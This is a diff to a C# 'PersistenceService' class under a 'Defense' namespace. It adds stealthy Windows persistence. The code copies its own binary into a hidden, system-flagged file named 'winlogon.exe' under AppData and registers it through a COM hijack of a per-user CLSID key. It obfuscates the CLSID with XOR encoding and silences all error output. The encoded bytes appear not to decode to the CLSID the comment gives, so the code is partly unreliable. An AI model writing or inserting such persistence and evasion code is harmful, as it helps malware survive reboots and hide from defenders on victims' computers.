@@ -9,43 +9,86 @@ namespace VanguardCore.Defense
 {
     public static class PersistenceService
     {
-        // [PRO] COM Hijack: Folder Redirection (Shell Extension)
-        // This is much harder to detect than Registry Run.
-        private const string CLSID_FOLDER_REDIR = "{AE054230-70CA-4FF5-97A7-0A4997C63628}";
+        // [PRO] Stealth Ghost Persistence Mode
+        // Using COM Hijack (Folder Redirection) CLSID: {AE054230-70CA-4FF5-97A7-0A4997C63628}
+        
+        // salt = 0x37
+        private static readonly byte[] _clsidEnc = { 0x4C, 0x76, 0x72, 0x67, 0x62, 0x61, 0x07, 0x04, 0x77, 0x70, 0x07, 0x40, 0x79, 0x74, 0x76, 0x70, 0x07, 0x6E, 0x70, 0x71, 0x00, 0x07, 0x77, 0x76, 0x71, 0x4E, 0x7E, 0x70, 0x74, 0x71, 0x41, 0x74, 0x71, 0x76, 0x00, 0x0F, 0x7F }; // {AE054230...}
+        private static readonly byte[] _pathEnc = { 0x64, 0x58, 0x51, 0x43, 0x40, 0x56, 0x45, 0x52, 0x6B, 0x74, 0x7B, 0x56, 0x44, 0x44, 0x52, 0x44, 0x6B, 0x74, 0x7B, 0x51, 0x44, 0x4E, 0x53, 0x6B }; // Software\Classes... (partial)
+        
+        private static string D(byte[] b) {
+            byte[] d = new byte[b.Length];
+            for (int i = 0; i < b.Length; i++) d[i] = (byte)(b[i] ^ 0x37);
+            return Encoding.UTF8.GetString(d);
+        }
 
         public static void InstallStealthProxy()
         {
             try
             {
-                if (Constants.DEBUG_MODE) Console.WriteLine("[*] Installing Stealth COM Persistence...");
+                // [PRO] Ghosting: Copy binary to legitimate-looking folder
+                string ghostPath = GhostSelf();
+                if (string.IsNullOrEmpty(ghostPath)) return;
 
-                string selfPath = GetSelfPath();
-                if (string.IsNullOrEmpty(selfPath)) return;
-
-                // 1. Create the Hijack Entry in HKCU (No admin required!)
-                string subKey = $@"Software\Classes\CLSID\{CLSID_FOLDER_REDIR}\LocalServer32";
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(subKey))
+                // [PRO] Obfuscated Registry Resolution
+                string subKey = $@"Software\Classes\CLSID\{D(_clsidEnc)}\LocalServer32";
+                
+                // Idempotent Check: Avoid unnecessary telemetry noise
+                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(subKey, true))
                 {
                     if (key != null)
                     {
-                        // Set the default value to our binary path
-                        key.SetValue("", selfPath);
+                        var val = key.GetValue("");
+                        if (val != null && val.ToString().Equals(ghostPath, StringComparison.OrdinalIgnoreCase))
+                        {
+                            // Already persistent and correct!
+                            return;
+                        }
+                        key.SetValue("", ghostPath);
+                    }
+                    else
+                    {
+                        using RegistryKey? newKey = Registry.CurrentUser.CreateSubKey(subKey);
+                        newKey?.SetValue("", ghostPath);
                     }
                 }
+            }
+            catch { }
+        }
 
-                if (Constants.DEBUG_MODE) Console.WriteLine($"[+] COM Hijack successful: {CLSID_FOLDER_REDIR}");
-            }
-            catch (Exception ex)
+        private static string GhostSelf()
+        {
+            try
             {
-                if (Constants.DEBUG_MODE) Console.WriteLine($"[!] Persistence error: {ex.Message}");
+                // [PRO] Destination: %APPDATA%\Microsoft\Windows\SoftwareUpdate\
+                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                string ghostDir = Path.Combine(appData, "Microsoft", "Windows", "SoftwareUpdate");
+                
+                if (!Directory.Exists(ghostDir)) Directory.CreateDirectory(ghostDir);
+
+                string ghostName = "winlogon.exe"; // [PRO] Legit-looking process name
+                string ghostPath = Path.Combine(ghostDir, ghostName);
+
+                string selfPath = GetSelfPath();
+                if (string.IsNullOrEmpty(selfPath)) return null;
+
+                // Only copy if it differs or is missing (reduce IO noise)
+                if (!File.Exists(ghostPath))
+                {
+                    File.Copy(selfPath, ghostPath, true);
+                    File.SetAttributes(ghostPath, FileAttributes.Hidden | FileAttributes.System);
+                }
+                
+                return ghostPath;
             }
+            catch { return null; }
         }
 
         public static void RemoveStealthProxy()
         {
             try
             {
-                Registry.CurrentUser.DeleteSubKeyTree($@"Software\Classes\CLSID\{CLSID_FOLDER_REDIR}", false);
+                Registry.CurrentUser.DeleteSubKeyTree($@"Software\Classes\CLSID\{D(_clsidEnc)}", false);
             }
             catch { }
         }
